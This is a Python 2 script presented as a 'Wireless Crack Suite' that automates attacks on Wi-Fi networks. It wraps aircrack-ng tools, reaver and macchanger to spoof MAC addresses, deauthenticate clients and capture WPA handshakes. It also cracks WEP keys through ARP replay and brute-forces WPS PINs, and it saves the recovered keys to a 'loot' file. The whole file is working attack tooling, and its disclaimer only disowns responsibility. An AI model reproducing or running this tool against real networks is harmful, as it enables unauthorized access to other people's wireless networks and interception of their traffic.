# -*- coding: utf-8 -*-

import subprocess, random, time, os, shlex, sys
from threading import *

# Global variables
work_network = ''
interface = ''
m_interface = ''
cap_file = ''
wash_cap = ''
c_mac = ''

if not os.path.isdir('loot'):
	os.mkdir('loot')

###################################


		
def ascii():
	print  '''
>>> Wireless Crack Suite
>>> Version 1.0
>>> Coded by: Sam        
>>> http://sam3.se
>>> info (at) sam3.se
'''

def menu():
	print '-- Start ----------------------------------------------------------------------------'
	print '0 - Exit\t\t\t| H\t- Help and disclaimer'
	print '1 - Start monitor mode\t\t| C\t- Clean up files in working directory'
	print '2 - Spoof MAC on interface\t| RM\t- Remove monitor mode on interface(s)'
	print '3 - Scan for networks\t\t| RN\t- Reset target network'
	print '4 - Pick target network\t\t| I\t- Packet injection test vs target network'
	print '5 - Show saved passwords\t|'	
	print '-- Reaver ----------------------- Misc ----------------------------------------------'
	print '6 - Find WPS-vurnerabilities\t| 8\t- Grab handshake'
	print '7 - Attack WPS-vulnerability\t| Wb\t- Basic WEP AP attack (with clients)'
	print '-------------------------------------------------------------------------------------'
	print '\n'

###################################

		
class wep:
	def __init__ (self):
		global work_network, m_interface, interface, c_mac	
		try:		
			self.mac = work_network.split()[1]
			self.channel = work_network.split()[2]
			self.n_type = work_network.split()[3]
			self.l = len(work_network)
			self.n_name = ''
			self.tmp = work_network.split()
		
			for x in range(self.l):
				try:
					self.n_name += self.tmp[x+4] + ' '
				except:
					pass
			if self.n_name[-1] == ' ':
				try:
					self.n_name = self.n_name.rstrip(' ')
				except:
					pass
		except:
			print '[!] Failed to initialize variables' 
			pass
	
	
	def test_injection(self):
		if interface != '' and m_interface != '':
			print '[+] Preparing card for injection test. Please wait\n\n'
			p = subprocess.Popen(['airmon-ng', 'stop', m_interface], stdout=subprocess.PIPE)
			time.sleep(1)
			p = subprocess.Popen(['airmon-ng', 'start', interface, self.channel], stdout=subprocess.PIPE)
			time.sleep(1)
			p = subprocess.Popen(['aireplay-ng', '-9', '-e', self.n_name, '-a', self.mac, m_interface], stdout=subprocess.PIPE)
			while True:
				line = p.stdout.readline()
				if line != '':
					print line.strip('\n')
				else:
					break
			print '[+] Resetting into monitor mode without bound channel. Please wait\n'
			p = subprocess.Popen(['airmon-ng', 'stop', m_interface], stdout=subprocess.PIPE)
			time.sleep(1)
			p = subprocess.Popen(['airmon-ng', 'start', interface], stdout=subprocess.PIPE)
			time.sleep(1)
		else:
			print '[!] Put card into monitor mode first and pick a network\n' 

	def simple_wep_crack(self):
		r = str(random.randint(9000000, 11000000))
		print '[+] Switching %s to channel %s' % (m_interface, str(self.channel))
		p = subprocess.Popen(['airmon-ng', 'stop', m_interface], stdout=subprocess.PIPE)
		time.sleep(1)
		p = subprocess.Popen(['airmon-ng', 'start', interface, str(self.channel)], stdout=subprocess.PIPE)
		os.system('airmon-ng start %s %s >> /dev/null' % (interface, self.channel) )
		time.sleep(1)
		# find any unrelated xterm windows
		x_term_p = find_xterm()
		# airodump capture in new xterm
		proc = subprocess.Popen(shlex.split('xterm -iconic -title "airodump-ng" -e ' + 'airodump-ng -c %s --bssid %s -w %s %s' % (str(self.channel), self.mac, str(r), m_interface)))	
		proc = subprocess.Popen(shlex.split('xterm -iconic -title "aireplay-ng" -e \'' + 'aireplay-ng -1 6000 -o 1 -q 10 -e "%s" -a %s -h %s %s\'' % (self.n_name, self.mac, c_mac, m_interface)))
		proc = subprocess.Popen(shlex.split('xterm -iconic -title "aireplay-ng arp" -e \'' + 'aireplay-ng -3 -b %s -h %s %s\'' % (self.mac, c_mac, m_interface)))
		time.sleep(2)
		while True:
			p = subprocess.Popen(['aircrack-ng -b %s %s-01.cap' % (self.mac, str(r))], stdout=subprocess.PIPE, shell=True)
			key_hex = ''
			decrypt_percent = ''
			while True:
				line = p.stdout.readline()
				if line != '':
					print line.strip('\n')
					if line.find('KEY FOUND!') != -1:
						key_hex = line.split(' ')[3]
					if line.find('Decrypted correctly:') != -1:
						decrypt_percent = line.split(' ')[2].strip('\n')
					if key_hex != '' and decrypt_percent != '':
						break
				else:
					break
			if key_hex != '' and decrypt_percent != '':
				break
				
			os.system('clear')
			print '[!] Not enough data captured yet. No network traffic? Sleeping 10 seconds before trying to crack again'
			time.sleep(10)	
			
		print '\n\n[+] Successfully cracked key. Killing terminals'
		print '[-] Key: ' + key_hex
		print '[-] Decrypting percent: ' + decrypt_percent
		print '[-] Writing credentials to file'
		f = open('loot/saved_credentials.txt', 'a')
		f.write('--------------------------------------------\n[AP SSID] %s\n[KEY] %s\n\n' % ( self.n_name, key_hex))
		f.close()
		x_term_a = find_xterm()
		for i in x_term_a:
			if i not in x_term_p:
				os.system('kill -9 %s' % str(i))

def find_xterm():
	p1 = subprocess.Popen('ps', stdout=subprocess.PIPE)
	xterm = []
	while True:
		line = p1.stdout.readline()
		if line != '':
			if line.find('xterm') != -1:
				x = line.split()[0]
				xterm.append(x)
		else:
			break
	return xterm

###################################

def grab_handshake():
	global work_network, m_interface	
	mac = work_network.split(' ')[1].strip('\n')
	channel = work_network.split(' ')[3].strip('\n')
	if channel == '':
		channel = work_network.split(' ')[4].strip('\n')
	if channel == '':
		channel = work_network.split(' ')[5].strip('\n')
	n_name = ''
	tmp = work_network.split()
	x_term_p = find_xterm()
	for x in range(len(work_network)):
		try:		
			n_name += tmp[x+4] + ' '
		except:
			pass
	n_name = n_name.strip('\n')	
	r = str(random.randint(1900000, 11100000))
	print '[+] Switching %s to channel %s' % (m_interface, str(channel))
	p1 = subprocess.Popen(['xterm -iconic -title "airmon" -e \'airmon-ng stop %s \'' % m_interface], shell=True)
	time.sleep(1)
	p2 = subprocess.Popen(['xterm -iconic -title "airmon" -e \'airmon-ng start %s %s\'' % (interface, channel)], shell=True)
	time.sleep(1)
	
	p3 = subprocess.Popen(['xterm -iconic -title "airodump" -e \'airodump-ng -c %s --bssid %s -w %s %s\'' % ( channel, mac, r, m_interface)],  shell=True)		
	print '[?] If you see weird error messages here it is probably because no data have been recieved. Just wait.'
	time.sleep(4)
	control = False
	first = False
	while True:
		p = subprocess.Popen(['aircrack-ng', r+'-01.cap'],  stdout=subprocess.PIPE)
		for line in iter(p.stdout.readline, ''):
			if line != '' or first == False:
				first = True
				if line.find('No data - WEP or WPA') != -1:
					os.system('clear')
					print '[-] No data captured yet. Sending 3 de_auth to AP then sleep '
					p3 = subprocess.Popen(['xterm -iconic -title "de_auth" -e \'aireplay-ng -0 6 -a %s -e %s %s\'' % ( mac, n_name, m_interface)], shell=True)
				if line.find('handshake)') != -1:
					types = 'WEP WPA WPA2 WPA2WPA'.split()
					try:
						for type in types:
							try:
								handshake = line.split(type + ' (')[1].split(' handshake)')[0]
							except:
								pass 
						if handshake != '0':
							print '[+] Got a handshake! Moving it to loot'
							os.system('cp %s loot/%s' % ( str(r)+'-01.cap', n_name.strip(' ')+str(r)+'-01.cap') )
								
							x_term_a = find_xterm()
							control = True
							for i in x_term_a:
								if i not in x_term_p:
									os.system('kill -9 %s' % str(i))
							break
					except:
						pass
				else:
					pass
			sys.stdout.flush()

		if os.path.isfile('loot/'+n_name.strip(' ')+str(r)+'-01.cap') == True:
			break
		else:
			time.sleep(12)

		try:
			f = open(r+'-01.csv', 'r')
			control = 0
			for lines in f:
				if control == 1:
					d_mac = lines.split()[0].replace(',', '')
					print '[+] Sending 6 de_auth packets to: ' + d_mac
					p2 = subprocess.Popen(['xterm -iconic -title "de_auth" -e \'aireplay-ng -0 6 -a %s -c %s %s\'' % ( mac, d_mac, m_interface)], shell=True)
				if lines.find('Station MAC') != -1:
					control = 1
		except:
			pass
	
###################################

def kill_reaver():
	reaver_p = find_reaver()
	time.sleep(15)
	reaver_a = find_reaver()
	for i in reaver_a:
		if i not in reaver_p:
			killpid = i
			print '\n\n[+] Killing test run. PID: ' + str(killpid)
			os.system('kill -9 %s' % str(i))
			break

def run_reaver(cmd):
	wps_pin = ''
	wpa_psk = ''
	ap_ssid = ''
	p = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	for line in iter(p.stdout.readline, ''):
		line = line.replace('\r', '').replace('\n', '')
		print line
		if line.find('[+] WPS PIN: \'') != -1:
			wps_pin = line.split()[-1].strip('\'')
		if line.find('[+] WPA PSK: \'') != -1:
			wpa_psk = line.split()[-1].strip('\'')
		if line.find('[+] AP SSID: \'') != -1:
			ap_ssid = line.split()[-1].strip('\'')

		sys.stdout.flush()
		if p.poll() is not None:
			break
	
	if ap_ssid != '' and wpa_psk == '' and wps_pin == '':
		run_reaver(cmd)
	
	if wpa_psk != '' or wps_pin != '':
		f = open('loot/saved_credentials.txt', 'a')
		f.write('--------------------------------------------\n[AP SSID] %s\n[WPS PIN] %s\n[WPA PSK] %s\n\n' % ( str(ap_ssid), str(wps_pin), str(wpa_psk)))
		f.close()

def reaver():
	global m_interface, work_network

	if work_network == '':
		print '[!] Pick target network first\n' 
	elif m_interface == '':
		print '[!] Configure monitor interface first\n' 
	else:
		w = work_network.split()
		mac, channel = work_network.split()[1], work_network.split()[2]
		print '[+] Running a test attack vs ap. Please wait 15 seconds and check output\n\n'
		cmd = 'reaver -i %s -b %s --auto -c %s -vv' % (m_interface, mac, str(channel))
		t = Thread(target=kill_reaver) 
		t.start()
		time.sleep(1)
		run_reaver(cmd)
		cmd = 'reaver -i %s -b %s -c %s --auto' % (m_interface, mac, str(channel))
		print '\n\n[?] If this looks good continue, otherwise tweak settings'
		print ' 1 - Continue\n 2 - Add arg(s) to launch command\n 3 - Return to menu'
		i = raw_input('Input: ')
		if i == '1':
			run_reaver(cmd)
			
		if i == '2':
			done = False
			cmd_temp = ''
			while done == False:
				os.system('reaver')
				cmd = 'reaver -i %s -b %s -c %s --auto' % (m_interface, mac, str(channel))
				print '\nCurrent command: %s %s' % (cmd, cmd_temp) 
				cmd_temp += raw_input('Args to add: ')
				print 'Current command: %s %s' % (cmd, cmd_temp) 
				done_temp = raw_input( '[?] Satisfied (y/n): ')
				if done_temp.upper() == 'Y' or done_temp.upper() == 'YES' or done_temp == '':
					done = True
				else:
					print '\n[!] Wiping command'
			cmd += ' ' + cmd_temp
			print '\n[+] Executing: %s\n' % (cmd)
			run_reaver(cmd)

def find_reaver():
	p1 = subprocess.Popen(['ps', '-al'], stdout=subprocess.PIPE)
	reaver = []
	while True:
		line = p1.stdout.readline()
		if line != '':
			if line.find('reaver') != -1:
				x = line.split()[3]
				reaver.append(x)
		else:
			break
	return reaver

def wash():
	global m_interface, wash_cap

	if m_interface == '':
		print '[!] Configure monitor interface first\n'
	else:
		t = raw_input('[?] For how long do you wish to scan for WPS-vurnable routers (s)? ')
		# randomize name of output file	
		wash_cap = str(random.randint(500000, 800000)) + '.wash'

		p = subprocess.Popen(['wash', '-i', m_interface, '-C', '-o', wash_cap], shell=False)
		time.sleep(int(t))
		p.terminate()

###################################

def list_creds():
	try:
		f = open('loot/saved_credentials.txt', 'r')
		print '\n[+] Saved credentials\n'
		for line in f.readlines():
			try:
				print line.strip('\n')
			except:
				pass
		print '\n\n'
	except:
		print '[!] No saved credentials :(\n' 
		pass

###################################

def spoof():
	p = subprocess.Popen(['airmon-ng'], shell=False)
	time.sleep(2)
	p.terminate()
	i_spoof = raw_input('Pick interface to spoof MAC on: ')
	# ugly ugly
	os.system('ifconfig %s down' % str(i_spoof))
	os.system('macchanger -r %s' % str(i_spoof))
	os.system('ifconfig %s up' % str(i_spoof))
 	print '\n'

def airodump():
	global cap_file
	i = ''
	while i == '':
		i = raw_input('For how long do you wish to scan (s)? ') 
	# randomize filename for capture output
	r = str(random.randint(100000,400000))
	cap_file = str(r) + '-01.csv'
	p = subprocess.Popen(['airodump-ng', '-w' , r, 'mon0'], stdout=subprocess.PIPE, shell=False)
	time.sleep(int(i))
	p.terminate()
	os.system('clear')
	return cap_file

def de_monitor():
	global m_interface
	p = subprocess.Popen(['airmon-ng'], shell=False)
	time.sleep(2)
	p.terminate()
	i_interface = raw_input('Which monitor interface do you wish to deactivate? ')
	p = subprocess.Popen(['airmon-ng', 'stop', i_interface], shell=False)
	time.sleep(2)
	p.terminate()
	if i_interface == m_interface:
		m_interface = ''

def monitor():
	global m_interface, interface
	m_interface = ''
	p = subprocess.Popen(['airmon-ng'], shell=False)
	time.sleep(2)
	p.terminate()
	interface = raw_input('Pick interface to activate monitor mode on: ')
	p = subprocess.Popen(['airmon-ng', 'start', interface], stdout=subprocess.PIPE)
	while True:
		line = p.stdout.readline()
		if line != '':
			if line.find('monitor mode enabled') != -1:
				m_interface = line.split()[-1].strip(')')
				print '[+] Successfully activated monitor mode.'
		else:
			break
	return m_interface

###################################

def parse_networks():
	global work_network, wash_cap, cap_file
	locallist = []
	nlist = []
	i = 1
	try:
		f = open(cap_file, 'r')
		for line in f:
			if line.find('Station') != -1:
				break
			if line.find('BSSID') == -1 and line.find('Station MAC') == -1 and line.find(',') != -1:
				network = line.strip('\n\r')
				network = network.strip('\t')
				locallist.append(network)
		f.close()
		locallist = list(set(locallist))
		print '\n\nNr - BSSID\t\t Channel\t Encryption\t\t ESSID'
		for network in locallist:
			n = network.replace('\r\n', '')
			n = n.split(',')
			try:
				mac, channel, encryption, essid = n[0], n[3], n[5], n[13]
				if encryption == ' WPA2WPA ':
					print '%s  - %s\t%s\t\t%s\t\t%s' % (str(i), str(mac), str(channel), str(encryption), str(essid))
				else:
					print '%s  - %s\t%s\t\t%s\t\t\t%s' % (str(i), str(mac), str(channel), str(encryption), str(essid))
				i += 1
				nlist.append(str(i) + ' ' + mac + ' ' + channel + ' ' + encryption + ' ' + essid) # ugly, fix
			except:
				pass
	except:
		pass
	print '\n'
	try:
		f = open(wash_cap)	
		# print output explanation here
		print '\n\nNr - BSSID\t\tChannel\tVurln\tVersion\tWPS-Locked\tESSID'
		for network in f:
			if network.find('WPS Version') != -1:
				pass
			else:
				n = network.replace('\r\n', '')
				n = n.split()
				try:
					l = len(n)
					essid = ''
					for x in range(l): # Build essid from array
						try:
							essid += n[x+5] + ' '
						except:
							pass 
					mac, channel, vers, encryption, wps_lock = n[0], n[1], n[3], 'WPS', n[4]
					print '%s  - %s\t%s\t%s\t%s\t%s\t\t%s' % (str(i), str(mac), str(channel), str(encryption), str(vers), str(wps_lock), str(essid))
					i += 1
					nlist.append(str(i) + ' ' + mac + ' ' + channel + ' ' + encryption + ' ' + essid)
				except:
					pass
	except:
		pass
	t_network = raw_input('Target network (nr): ')
	try:
		work_network = str(nlist[int(t_network)-1])
	except:
		print '[!] Fobar. Index out of range. Try again.' 
		pass

def find_mac():
	global m_interface, c_mac
	if m_interface != '':
		p = subprocess.Popen(['macchanger', m_interface], stdout=subprocess.PIPE)
		while True:
			line = p.stdout.readline()
			if line != '':
				if line.find('Current') != -1:
					c_mac = line.split(' ')[4]
			else:
				break
	else:
		pass
###################################
	
def help():
	print '\n\n[+] Help\n 1 - Configure Device\n 2 - Scan for networks (airodump or wash)\n 3 - Pick network and assault it\n 4 - ???\n 5 - Profit!'
	print '\n[!] WCS need the following binaries to run: reaver, wash, aircrack-ng, macchanger, xterm'
	print '\n[!] DISCLAIMER\n\nWhatever you do, you do it on your own.\nThe author of this script nor associated programs can NOT be held resposible in any way at all.\n\n'

###################################

os.system('clear')
ascii()
print '\tYou can\'t fight in here, this is a war room!\n'

while True:
	find_mac()
	menu()
	try:
		if m_interface != '':
			print 'Monitor interface: [%s]' % m_interface
	except:
		pass
	try:
		if work_network != '':
			menu_output_essid = ''
			tmp = work_network.split()
			for x in range(len(work_network)):
				try:
					menu_output_essid += tmp[x+4] + ' '
				except:
					pass
			print 'Target network: [%s- %s]' % (menu_output_essid ,  work_network.split()[3])
	except:
		pass
	x = raw_input('Input: ')
	if x == '0':
		exit()
	elif x == '1':
		m_interface = monitor()
	elif x == '2':
		spoof()
	elif x == '3':
		try:
			cap_file = airodump()
		except:
			print '[!] Something went wrong. Did you activate monitor mode?'
			pass
	elif x == '4':
		parse_networks()
	elif x == '5':
		list_creds()
	elif x == '6':
		wash()
	elif x == '7':
		reaver()
	elif x.upper() == '8':
		try:
			grab_handshake()
		except:
			print '[!] Something went wrong. Pick network and activate monitor mode.'
			pass
	elif x.upper() == 'RM':
		de_monitor()
	elif x.upper() == 'C':
		os.system('rm *.cap *.wash *kismet* *.csv 2> /dev/null')
		print '[+] Removing files.'
	elif x.upper() == 'RN':
		work_network = ''
	elif x.upper() == 'RI':
		m_interface = ''
	elif x.upper() == 'H':
		help()
	elif x.upper() == 'I':
		try:
			wep_net = wep()
			wep_net.test_injection()
		except:
			print '[!] Something went wrong. You probably forgot to pick a network'
			pass
	elif x.upper() == 'WB':
		try:
			wep_net = wep()
			wep_net.simple_wep_crack()
		except:
			print  '[!] Something went wrong. You probably forgot to pick a network' 
			pass



